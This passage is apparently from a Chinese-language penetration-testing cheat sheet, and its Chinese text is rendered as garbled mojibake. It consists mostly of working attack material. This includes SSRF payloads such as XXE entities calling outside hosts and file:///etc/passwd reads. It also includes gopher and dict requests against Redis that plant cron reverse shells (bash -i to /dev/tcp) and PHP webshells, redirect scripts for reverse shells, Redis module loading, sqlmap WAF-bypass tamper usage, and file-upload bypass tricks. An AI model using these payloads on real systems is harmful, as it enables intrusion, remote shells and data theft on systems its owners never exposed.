æ•°æ®åº“å†…ç½®åŠŸèƒ½(mongodbçš„copyDatabaseå‡½æ•°)
é‚®ä»¶ç³»ç»Ÿ
æ–‡ä»¶å¤„ç†
åœ¨çº¿å¤„ç†å·¥å…·
ä»URLå…³é”®å­—ä¸­å¯»æ‰¾ï¼šshareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3gã€displayã€sourceURlã€imageURLã€domain
</code></pre>
<h6 id="XML-1"><a href="#XML-1" class="headerlink" title="XML"></a>XML</h6><pre><code>&lt;!ENTITY % d SYSTEM &quot;http://wuyun.org/evil.dtd&quot;&gt;
&lt;!ENTITY % file system &quot;file:///etc/passwd&quot; &gt;
&lt;!ENTITY % d SYSTEM &quot;http://wuyun.org/file?data=%file&quot;&gt;
&lt;!DOCTYPE roottag PUBLIC &quot;-//VSR//PENTEST//EN&quot; &quot;http://wuyun.org/urlin&quot;&gt;
&lt;xenc:AgreementMethod Algorithm= &quot;http://wuyun.org/1&quot;&gt;
&lt;xenc:EncryptionProperty Target= &quot;http://wuyun.org/2&quot;&gt;
&lt;xenc:CipherReference URI= &quot;http://wuyun.org/3&quot;&gt;
&lt;xenc:DataReference URI= &quot;http://wuyun.org/4&quot;&gt;
&lt;Reference URI=&quot;http://wuyun.org/5&quot;&gt;
&lt;To xmlns=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;http://wuyun.org/to&lt;/To&gt;
&lt;ReplyTo xmlns=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;
&lt;Address&gt;http://wuyun.org/rto&lt;/Address&gt;
&lt;input message=&quot;wooyun&quot; wsa:Action=&quot;http://wuyun.org/ip&quot; /&gt;
&lt;output message=&quot;wooyun&quot; wsa:Action=&quot;http://wuyun.org/op&quot; /&gt;
&lt;wsp:PolicyReference URI=â€œhttp://wuyun.org/pr&quot;&gt;
&lt;fed:Federation FederationID=&quot;http://wuyun.org/fid&quot;&gt;
&lt;fed:FederationInclude&gt;http://wuyun.org/inc&lt;/fed:FederationInclude&gt;
&lt;fed:TokenIssuerName&gt;http://wuyun.org/iss&lt;/fed:TokenIssuerName&gt;
&lt;mex:MetadataReference&gt;
&lt;wsa:Address&gt;http://wuyun.org/mex&lt;/wsa:Address&gt;
&lt;/mex:MetadataReference&gt;
&lt;edmx:Reference URI=&quot;http://wuyun.org/edmxr&quot;&gt;
&lt;edmx:AnnotationsReference URI=&quot;http://wuyun.org/edmxa&quot;&gt;
&lt;xbrli:identifier scheme=&quot;http://wuyun.org/xbr&quot;&gt;
&lt;link:roleType roleURI=&quot;http://wuyun.org/role&quot;&gt;
&lt;stratml:Source&gt;http://wuyun.org/stml&lt;/stratml:Source&gt;
</code></pre>
<h6 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h6><h6 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h6><pre><code>db.copyDatabase(&#39;\r\nconfig set dbfilename ssrf\r\nquit\r\nâ€™,&#39;test&#39;,&#39;10.6.4.166:6379&#39;)
</code></pre>
<h6 id="PostgresSQL"><a href="#PostgresSQL" class="headerlink" title="PostgresSQL"></a>PostgresSQL</h6><pre><code>SELECT dblink_send_query(
 &#39;host=127.0.0.1 
dbname=quit 
user=\&#39;\r\nconfig set dbfilename wyssrf\r\n\quit\r\n&#39; 
password=1 port=6379 sslmode=disable&#39;, 
&#39;select version();â€™ 
);
</code></pre>
<h6 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h6><pre><code>SELECT openrowset(&#39;SQLOLEDB&#39;, &#39;server=192.168.1.5;uid=sa;pwd=sa;database=master&#39;)
SELECT * FROM OpenDatasource(&#39;SQLOLEDB&#39;, &#39;Data Source=ServerName;User ID=sa;Password=sa&#39; ) .Northwind.dbo.Categories
</code></pre>
<h6 id="å›¾ç‰‡å¤„ç†å‡½æ•°"><a href="#å›¾ç‰‡å¤„ç†å‡½æ•°" class="headerlink" title="å›¾ç‰‡å¤„ç†å‡½æ•°"></a>å›¾ç‰‡å¤„ç†å‡½æ•°</h6><pre><code>FFmpeg
concat:http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd
ImageMagick
fill &#39;url(http://wyssrf.wuyun.org)&#39;
</code></pre>
<h5 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h5><pre><code>æµ‹è¯•ä»£ç ,éœ€å®‰è£…phpcurlæ¨¡å—apt-get install php7.0-curl
&lt;?php
echo &#39;r u ok?&#39;;
function curl($url)&#123;  
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_exec($ch);
curl_close($ch);
&#125;
$url = $_GET[&#39;url&#39;];
curl($url);
?&gt;
å¯¹å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–æœåŠ¡çš„banner ä¿¡æ¯
æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åº
å¯¹å†…ç½‘ WEB åº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç°(å¦‚ï¼šreadmeæ–‡ä»¶)
æ”»å‡»å†…å¤–ç½‘çš„ web åº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ GET å‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»(å¦‚ï¼šStruts2ï¼Œsqli)
è¯»å–å†…ç½‘èµ„æº(å¦‚ï¼šåˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰)
è·³æ¿
æ— è§†cdn
åˆ©ç”¨Redisæœªæˆæƒè®¿é—®ï¼ŒHTTP CRLFæ³¨å…¥å®ç°getshell
</code></pre>
<h6 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h6><pre><code>&gt;curl -v &#39;http://192.168.0.110/ssrf.php?url=file:///etc/passwd&#39;
</code></pre>
<p><img src="./img/12.png" alt="image"></p>
<pre><code>?url=php://filter/read=convert.base64-encode/resource=./1.php
</code></pre>
<h5 id="ç«¯å£æ¢æµ‹"><a href="#ç«¯å£æ¢æµ‹" class="headerlink" title="ç«¯å£æ¢æµ‹"></a>ç«¯å£æ¢æµ‹</h5><pre><code>&gt;curl -v &#39;http://www.xx.com/ssrf.php?url=dict://127.0.0.1:22/&#39;
</code></pre>
<p><img src="./img/13.png" alt="image"></p>
<pre><code>&gt;curl -v &#39;http://www.xx.com/ssrf.php?url=dict://127.0.0.1:6379/info&#39;
</code></pre>
<p><img src="./img/14.png" alt="image"></p>
<h6 id="SSRF-Redis"><a href="#SSRF-Redis" class="headerlink" title="SSRF+Redis"></a>SSRF+Redis</h6><pre><code>&gt;curl -v &#39;http://192.168.0.112/ssrf.php?url=gopher://192.168.0.120:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.0.108%2f12345%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#39;
</code></pre>
<p><img src="./img/15.png" alt="image"><br><img src="./img/16.png" alt="image"></p>
<h6 id="302åå¼¹shell"><a href="#302åå¼¹shell" class="headerlink" title="302åå¼¹shell"></a>302åå¼¹shell</h6><pre><code>?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=flushall
302.php
&lt;?php
$ip = $_GET[&#39;ip&#39;];
$port = $_GET[&#39;port&#39;];
$scheme = $_GET[&#39;s&#39;];
$data = $_GET[&#39;data&#39;];
header(&quot;Location: $scheme://$ip:$port/$data&quot;);
?&gt;
?url=http://xxxx/reverse.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;bhost=*.*.*.*&amp;bport=1234
reverse.php
&lt;?php
$ip = $_GET[&#39;ip&#39;];
$port = $_GET[&#39;port&#39;];
$bhost = $_GET[&#39;bhost&#39;];
$bport = $_GET[&#39;bport&#39;];
$scheme = $_GET[&#39;s&#39;];
header(&quot;Location: $scheme://$ip:$port/set:0:\&quot;\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-i\\x20&gt;\\x26\\x20/dev/tcp/&#123;$bhost&#125;/&#123;$bport&#125;\\x200&gt;\\x261\\x0a\\x0a\\x0a\&quot;&quot;);
?&gt;
?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=config:set:dir:/var/spool/cron/
?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=config:set:dbfilename:root
?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=save
å¯è®¾ç½®burpâ€“&gt;intruderæŒ‡å®šå˜é‡è·‘ã€‚
</code></pre>
<h6 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h6><pre><code>https://github.com/FoolMitAh/mysql_gopher_attack
https://fireshellsecurity.team/isitdtu-friss/
</code></pre>
<h6 id="Weblogic-SSRF-Redis"><a href="#Weblogic-SSRF-Redis" class="headerlink" title="Weblogic SSRF+Redis"></a>Weblogic SSRF+Redis</h6><pre><code>æ¢æµ‹
/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:80
Redisåå¼¹
set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/121.36.67.230/4444 0&gt;&amp;1\n\n\n\n&quot;
config set dir /etc/
config set dbfilename crontab
save
/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://192.168.0.110:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.36.67.230%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
SSRF+å†…ç½‘Struct2
http://www.xx.com/ssrf.php?url=http://10.1.1.1/action?action?redirect:http://attackerip/
</code></pre>
<h6 id="Ueditor-SSRF"><a href="#Ueditor-SSRF" class="headerlink" title="Ueditor SSRF"></a>Ueditor SSRF</h6><pre><code>/editor/ueditor/php/controller.php?action=catchimage&amp;source[]=http://my.ip/?aaa=1%26logo.png
</code></pre>
<h6 id="Discuz"><a href="#Discuz" class="headerlink" title="Discuz"></a>Discuz</h6><pre><code>/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://b182oj.ceye.io/xx.jpg[/img]&amp;formhash=xxoo
</code></pre>
<h6 id="æ¢æµ‹å­˜æ´»ä¸»æœº"><a href="#æ¢æµ‹å­˜æ´»ä¸»æœº" class="headerlink" title="æ¢æµ‹å­˜æ´»ä¸»æœº"></a>æ¢æµ‹å­˜æ´»ä¸»æœº</h6><pre><code>ç›´æ¥è®¿é—®
http://www.xx.com/ssrf.php?url=http://192.168.0.1
</code></pre>
<p><img src="./img/17.png" alt="image"></p>
<pre><code>ä¼ªé€ POSTè¯·æ±‚
&gt;curl -v &#39;http://www.xx.com/ssrf.php?url=gopher://192.168.0.10:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%20192.168.220.139%250d%250aUser-Agent:%20curl/7.42.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd=bbbbb&#39;
</code></pre>
<h6 id="ç»•è¿‡æ–¹æ³•"><a href="#ç»•è¿‡æ–¹æ³•" class="headerlink" title="ç»•è¿‡æ–¹æ³•"></a>ç»•è¿‡æ–¹æ³•</h6><pre><code>æœ¬åœ°ç»•è¿‡
http://127.0.0.1=http://localhost
[::]ç»•è¿‡
http://[::]:80=http://127.0.0.1
@ç»•è¿‡
http://www.xx.com/1.php?url=http://www.xx.com@127.0.0.1:8080
åˆ©ç”¨çŸ­ç½‘å€
http://tool.chinaz.com/tools/dwz.aspx
http://dwz.cn/
DNSè§£æ
http://www.qq.com.127.0.0.1.xip.ioï¼Œå¯è§£æä¸º127.0.0.1
è‡ªå·±åŸŸåè®¾ç½®Aè®°å½•ï¼ŒæŒ‡å‘127.0.0.1
è¿›åˆ¶è½¬æ¢
127.0.0.1
å…«è¿›åˆ¶ï¼š0177.0.0.1
åå…­è¿›åˆ¶ï¼š0x7f.0.0.1
åè¿›åˆ¶ï¼š2130706433
http://www.bejson.com/convert/ip2int/
å¥å·
127ã€‚0ã€‚0ã€‚1
302è„šæœ¬
&lt;?php
$ip = $_GET[&#39;ip&#39;];
$port = $_GET[&#39;port&#39;];
$scheme = $_GET[&#39;s&#39;];
$data = $_GET[&#39;data&#39;];
header(&quot;Location: $scheme://$ip:$port/$data&quot;);
?&gt;
æ”»å‡»æ–¹VPSç›‘å¬8080
dictåè®®
dict://www.attack.com:8080/hello:dictç­‰äº
ssrf.php?url=http://attack.com/302.php?s=dict&amp;ip=www.attack.com&amp;port=8080&amp;data=hello:dict
Gopheråè®®
gopher:// www.attack.com:8080/gopher
ssrf.php?url=http://attack.com/302.php?s=gopher&amp;ip=www.attack.com&amp;port=8080&amp;data=gopher
Fileåè®®
æ”»å‡»æœºæ–°å»ºfile.php
&lt;?php
header(&quot;Location: file:///etc/passwd&quot;);
?&gt;
ssrf.php?url=http://attack.com/file.php
</code></pre>
<h6 id="gopheråè®®çš„è„šæœ¬è½¬æ¢"><a href="#gopheråè®®çš„è„šæœ¬è½¬æ¢" class="headerlink" title="gopheråè®®çš„è„šæœ¬è½¬æ¢"></a>gopheråè®®çš„è„šæœ¬è½¬æ¢</h6><pre><code>æŠ“å–æœ¬åœ°æµ‹è¯•çš„æ­£å¸¸è¯·æ±‚
&gt;socat -v tcp-listen:4444,fork tcp-connect:ç›®æ ‡IP:6379
</code></pre>
<p><img src="./img/18.png" alt="image"><br><img src="./img/19.png" alt="image"></p>
<pre><code>å°†æ•è·æ—¥å¿—ä¿å­˜txt
ä½¿ç”¨è„šæœ¬è½¬æ¢ä¸ºæ”¯æŒgopheråè®®çš„å­—ç¬¦ä¸²
è½¬æ¢è§„åˆ™
å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯&gt;æˆ–è€…&lt; é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¯·æ±‚å’Œè¿”å›çš„æ—¶é—´ã€‚
å¦‚æœå‰3ä¸ªå­—ç¬¦æ˜¯+OK é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¿”å›çš„å­—ç¬¦ä¸²ã€‚
å°†\rå­—ç¬¦ä¸²æ›¿æ¢æˆ%0d%0a
ç©ºç™½è¡Œæ›¿æ¢ä¸º%0a
</code></pre>
<p><img src="./img/20.png" alt="image"></p>
<pre><code>æœ¬åœ°å¯æ‰§è¡Œ
</code></pre>
<p><img src="./img/21.png" alt="image"></p>
<pre><code>è¿œç¨‹æ‰§è¡Œéœ€å¯¹ç©ºæ ¼è¿›è¡Œç¼–ç åå†urlç¼–ç ä¸€æ¬¡
*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/192.168.0.108/12138%200&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
</code></pre>
<p><img src="./img/22.png" alt="image"><br><img src="./img/23.png" alt="image"><br><img src="./img/24.png" alt="image"></p>
<h6 id="åè®®"><a href="#åè®®" class="headerlink" title="åè®®"></a>åè®®</h6><pre><code>Curlç‰ˆæœ¬éœ€ä½äº7.15.1
file:å¯å›æ˜¾æ—¶ï¼Œä½¿ç”¨fileè¯»å–ä»»æ„æ–‡ä»¶
dict:æŸ¥çœ‹ç«¯å£ï¼Œæ“ä½œå†…ç½‘æœåŠ¡
gopher:å¯å‘å‡ºget/postè¯·æ±‚
ä½¿ç”¨gopheråè®®æ—¶ï¼Œè¦è¿›è¡Œä¸¤æ¬¡urlç¼–ç 
http/https:æ¢æµ‹å­˜æ´»ä¸»æœº
</code></pre>
<h6 id="dictåè®®å†™shell"><a href="#dictåè®®å†™shell" class="headerlink" title="dictåè®®å†™shell"></a>dictåè®®å†™shell</h6><pre><code>?url=dict://127.0.0.1:6379/set:x:&lt;?php phpinfo();?&gt;
?url=dict://127.0.0.1:6379/config:set:dir:/www/wwwroot/
?url=dict://127.0.0.1:6379/config:set:dbfilename:php.php
?url=dict://127.0.0.1:6379/save
Unicodeç¼–ç 
?url=dict://127.0.0.1:6379/set:x:&quot;\x3C\x3Fphp\x20echo `$_GET[x]`\x3B\x3F\x3E&quot;
</code></pre>
<h6 id="slaveofå¤åˆ¶shellåˆ°ç›®æ ‡"><a href="#slaveofå¤åˆ¶shellåˆ°ç›®æ ‡" class="headerlink" title="slaveofå¤åˆ¶shellåˆ°ç›®æ ‡"></a>slaveofå¤åˆ¶shellåˆ°ç›®æ ‡</h6><pre><code>From:http://r3start.net/index.php/2020/05/09/683
ä½ çš„redisè®¾ç½®ä¸€ä¸ªshellçš„é”®
Yourredis&gt;FLUSHALL
Yourredis&gt;set shell &quot;&lt;?php phpinfo();?&gt;&quot;
?url=dict://127.0.0.1:6379/slaveof:yourredisIP:6379
?url=dict://127.0.0.1:6379/config:set:dir:/www/wwwroot/
?url=dict://127.0.0.1:6379/config:set:dbfilename:test.php
?url=dict://127.0.0.1:6379/save
?url=dict://127.0.0.1:6379/slaveof:no:one
</code></pre>
<h6 id="slaveofåå¼¹shell"><a href="#slaveofåå¼¹shell" class="headerlink" title="slaveofåå¼¹shell"></a>slaveofåå¼¹shell</h6><pre><code>?url=dict://127.0.0.1:6379/slaveof: yourredisIP:6379
?url=dict://127.0.0.1:6379/config:set:dbfilename:exp.so
?url=dict://127.0.0.1:6379/MODULE:LOAD:./exp.so
?url=dict://127.0.0.1:6379/SLAVEOF:NO:ONE
?url=dict://127.0.0.1:6379/config:set:dbfilename:dump.rdb
?url=dict://127.0.0.1:6379/system.exec:&#39;curl x.x.x.x/x&#39;
?url=dict://127.0.0.1:6379/system.rev:x.x.x.x:8887
</code></pre>
<h4 id="Fuzz-æ‰«æweb"><a href="#Fuzz-æ‰«æweb" class="headerlink" title="Fuzz/æ‰«æweb"></a>Fuzz/æ‰«æweb</h4><pre><code>#dirb http://192.168.0.1 /root/asp.txt,/root/dir.txt -a &quot;USER-AGENT&quot; â€“c &quot;Cookie&quot; -z 100
#nikto -C all -h http://192.168.0.107 niktoæ‰«æwebæœåŠ¡
#wpscan --url http://192.168.0.107/ -e u --wordlist /root/wordlist.txt æšä¸¾ç”¨æˆ·çˆ†ç ´å¯†ç 
#wpscan --url http://192.168.0.107/ -e vp æ‰«ææ¼æ´æ’ä»¶
#perl joomscan.pl --url 192.168.0.107
</code></pre>
<h5 id="WFuzz"><a href="#WFuzz" class="headerlink" title="WFuzz"></a>WFuzz</h5><pre><code>çˆ†ç ´æ–‡ä»¶å’Œæ–‡ä»¶å¤¹
&gt;wfuzz -w wordlist URL/FUZZ.php
&gt;wfuzz -w wordlist URL/FUZZ
æšä¸¾æ•°å­—å‚æ•°
&gt;wfuzz -z range,000-999 -b session=session -b cookie=cookie http://127.0.0.1/getuser.php?uid=FUZZ
POSTè´¦å·å¯†ç çˆ†ç ´FUZnZ
&gt;wfuzz -w userList -w pwdList -d &quot;username=FUZZ&amp;password=FUZ2Z&quot; http://127.0.0.1/login.php
éšæœºHTTPå¤´
&gt;wfuzz -z range,0000-9999 -H &quot;X-Forwarded-For: FUZZ&quot; http://127.0.0.1/get.php?userid=666
ä½¿ç”¨ä»£ç†fuzz
&gt;wfuzz -w wordlist -p 127.0.0.1:1087:SOCKS5 URL/FUZZ
åŸºç¡€è®¤è¯çˆ†ç ´
&gt;wfuzz -z list,&quot;username-password&quot; --basic FUZZ:FUZZ URL
ã€ç»“æœè¿‡æ»¤ã€‘--hcæˆ–--ssä¸æ˜¾ç¤ºç¬¦åˆæ¡ä»¶çš„ç»“æœã€‚
ã€ç»“æœè¿‡æ»¤ã€‘--scæˆ–--slæˆ–--swæˆ–--shæ˜¾ç¤ºç¬¦åˆæ¡ä»¶çš„ç»“æœã€‚
</code></pre>
<h5 id="Cewl"><a href="#Cewl" class="headerlink" title="Cewl"></a>Cewl</h5><pre><code>çˆ¬è¡Œç½‘ç«™å­˜ä¸ºå­—å…¸
&gt;cewl http://www.qq.com/ -w dict.txt
æŒ‡å®šå­—å…¸é•¿åº¦
&gt;cewl http://www.qq.com/ -m 9 -w dict.txt
ç½‘ç«™æå–Email
&gt;cewl http://www.qq.com/ -n â€“e
</code></pre>
<h5 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h5><pre><code>&gt;python3 dirsearch.py --random-user-agents --recursive --thread 50 --extension php --plain-text-report report.txt â€“url http://127.0.0.1
</code></pre>
<h4 id="Bypass-WAF"><a href="#Bypass-WAF" class="headerlink" title="Bypass WAF"></a>Bypass WAF</h4><h5 id="SQLæ³¨å…¥åˆ†å—ä¼ è¾“"><a href="#SQLæ³¨å…¥åˆ†å—ä¼ è¾“" class="headerlink" title="SQLæ³¨å…¥åˆ†å—ä¼ è¾“"></a>SQLæ³¨å…¥åˆ†å—ä¼ è¾“</h5><pre><code>https://github.com/c0ny1/chunked-coding-converter
</code></pre>
<p><img src="./img/25.png" alt="image"><br><img src="./img/26.png" alt="image"></p>
<pre><code>è·‘æ³¨å…¥ç‚¹è¢«æ‹¦æˆª
</code></pre>
<p><img src="./img/27.png" alt="image"></p>
<pre><code>ä½¿ç”¨åˆ†å—ä¼ è¾“ï¼Œå³é”®é€‰æ‹©
</code></pre>
<p><img src="./img/28.png" alt="image"><br><img src="./img/30.png" alt="image"></p>
<pre><code>ä½¿ç”¨SQLMAPè·‘æ³¨å…¥
</code></pre>
<p><img src="./img/31.png" alt="image"><br><img src="./img/32.png" alt="image"></p>
<pre><code>&gt;python sqlmap.py -r 1.txt --batch --proxy=http://127.0.0.1:8080 --dbs
</code></pre>
<p><img src="./img/33.png" alt="image"></p>
<h5 id="è‡ªåŠ¨æä¾›å¯ç”¨çš„tamper"><a href="#è‡ªåŠ¨æä¾›å¯ç”¨çš„tamper" class="headerlink" title="è‡ªåŠ¨æä¾›å¯ç”¨çš„tamper"></a>è‡ªåŠ¨æä¾›å¯ç”¨çš„tamper</h5><pre><code>https://github.com/m4ll0k/Atlas
GETç±»å‹çš„æ³¨å…¥
python atlas.py --url http://site.com/index/id/%%10%% --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v
POSTç±»å‹çš„æ³¨å…¥
python atlas.py --url http://site.com/index/id/ -m POST -D &#39;test=%%10%%&#39; --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v
è¯·æ±‚å¤´æ³¨å…¥
python atlas.py --url http://site.com/index/id/ -H &#39;User-Agent: mozilla/5.0%%inject%%&#39; -H &#39;X-header: test&#39; --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v
ç»„åˆtamper
python atlas.py --url http://site.com/index/id/%%10%% --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --concat &quot;equaltolike,htmlencode&quot; --random-agent -v
åˆ—å‡ºtamper
python atlas.py -g
ä¾‹å­
æ³¨å…¥
python sqlmap.py -u &#39;http://site.com/index.php?id=Price_ASC&#39; --dbs --random-agent -v 3
</code></pre>
<p><img src="./img/658.png" alt="image"></p>
<pre><code>å¯ä»¥çœ‹åˆ°è¢«æ‹¦æˆªäº†
æŸ¥æ‰¾èƒ½ç»•è¿‡çš„tamper
python atlas.py --url &#39;http://site.com/index.php?id=Price_ASC&#39; --payload=&quot;&#39;) AND 8716=4837 AND (&#39;yajr&#39;=&#39;yajr&quot; --random-agent -v
</code></pre>
<p><img src="./img/659.png" alt="image"></p>
<pre><code>æ ¹æ®è¿”å›ç 200å¾—åˆ°ä¸€ä¸ªå¯ç»•è¿‡wafçš„tamper
versionedkeywordsè¿™ä¸ªtamper
ç»§ç»­æ³¨å…¥
python sqlmap.py -u &#39;http://site.com/index.php?id=Price_ASC&#39; --dbs --random-agent -v 3 --tamper=versionedkeywords
æ ¹æ®çŠ¶æ€ç æ¥åˆ¤æ–­æœ‰æ—¶ä¼šæœ‰ç‚¹é¸¡è‚‹ï¼Œä½†æ˜¯ä¹Ÿèƒ½ç”¨ç”¨ï¼Œéšæœºå‘æŒ¥å§ã€‚
</code></pre>
<h5 id="åƒåœ¾æ•°æ®"><a href="#åƒåœ¾æ•°æ®" class="headerlink" title="åƒåœ¾æ•°æ®"></a>åƒåœ¾æ•°æ®</h5><pre><code>#coding=utf-8
import random,string
from urllib import parse
# code by yzddMr6
varname_min = 5
varname_max = 15
data_min = 20
data_max = 25
num_min = 50
num_max = 100
def randstr(length):
    str_list = [random.choice(string.ascii_letters) for i in range(length)]
    random_str = &#39;&#39;.join(str_list)
    return random_str
def main():
    data=&#123;&#125;
    for i in range(num_min,num_max):
        data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))
    print(&#39;&amp;&#39;+parse.urlencode(data)+&#39;&amp;&#39;)
main()
æ”¾åˆ°è¦æ³¨å…¥çš„å­—æ®µå‰å
</code></pre>
<h5 id="ä¸Šä¼ bypass"><a href="#ä¸Šä¼ bypass" class="headerlink" title="ä¸Šä¼ bypass"></a>ä¸Šä¼ bypass</h5><h6 id="å›¾ç‰‡æ–‡ä»¶å¤´"><a href="#å›¾ç‰‡æ–‡ä»¶å¤´" class="headerlink" title="å›¾ç‰‡æ–‡ä»¶å¤´"></a>å›¾ç‰‡æ–‡ä»¶å¤´</h6><pre><code>PNG çš„æ–‡ä»¶å¤´ä¸ºåå…­è¿›åˆ¶çš„ 89 50 4E 47 0D 0A 1A 0A
GIF ä¸º 47 49 46 38 37 61
JPG ä¸º FF D8 FF E0
</code></pre>
<h6 id="æ·»åŠ å›¾ç‰‡å¤´æˆ–åˆå¹¶å›¾ç‰‡åŒ…å«"><a href="#æ·»åŠ å›¾ç‰‡å¤´æˆ–åˆå¹¶å›¾ç‰‡åŒ…å«" class="headerlink" title="æ·»åŠ å›¾ç‰‡å¤´æˆ–åˆå¹¶å›¾ç‰‡åŒ…å«"></a>æ·»åŠ å›¾ç‰‡å¤´æˆ–åˆå¹¶å›¾ç‰‡åŒ…å«</h6><h6 id="åç¼€å¤§å°å†™"><a href="#åç¼€å¤§å°å†™" class="headerlink" title="åç¼€å¤§å°å†™"></a>åç¼€å¤§å°å†™</h6><h6 id="æ–‡ä»¶åå‰ç¼€åŠ -0x09"><a href="#æ–‡ä»¶åå‰ç¼€åŠ -0x09" class="headerlink" title="æ–‡ä»¶åå‰ç¼€åŠ [0x09]"></a>æ–‡ä»¶åå‰ç¼€åŠ [0x09]</h6><h6 id="ä¸Šä¼ -htaccess"><a href="#ä¸Šä¼ -htaccess" class="headerlink" title="ä¸Šä¼ .htaccess"></a>ä¸Šä¼ .htaccess</h6><pre><code>SetHandler application/x-httpd-php
</code></pre>
<h6 id="äºŒæ¬¡æ¸²æŸ“"><a href="#äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="äºŒæ¬¡æ¸²æŸ“"></a>äºŒæ¬¡æ¸²æŸ“</h6><pre><code>GIF
æ‰¾å¥½ä¸€ä¸ªå¤§ä¸€ç‚¹çš„GIFï¼Œå°¾éƒ¨ä½¿ç”¨c32æ’å…¥shellï¼Œä¸Šä¼ ï¼Œä¸‹è½½å›æ¥ï¼Œä½¿ç”¨burpçš„compareråŠŸèƒ½æ‰¾å‡ºæ•´ä¸ªæ–‡ä»¶æ²¡æœ‰è¢«æ¸²æŸ“çš„ä½ç½®ï¼Œæ’å…¥shellå†ä¸Šä¼ 
JPG
ä½¿ç”¨è„šæœ¬ç›´æ¥ç”Ÿæˆ
https://github.com/BlackFan/jpg_payload
PNG
ä½¿ç”¨è„šæœ¬ç›´æ¥ç”Ÿæˆ
å…ˆå–æ¶ˆphp.iniæ³¨é‡Š;extension=php_gd2.dll
&lt;?php
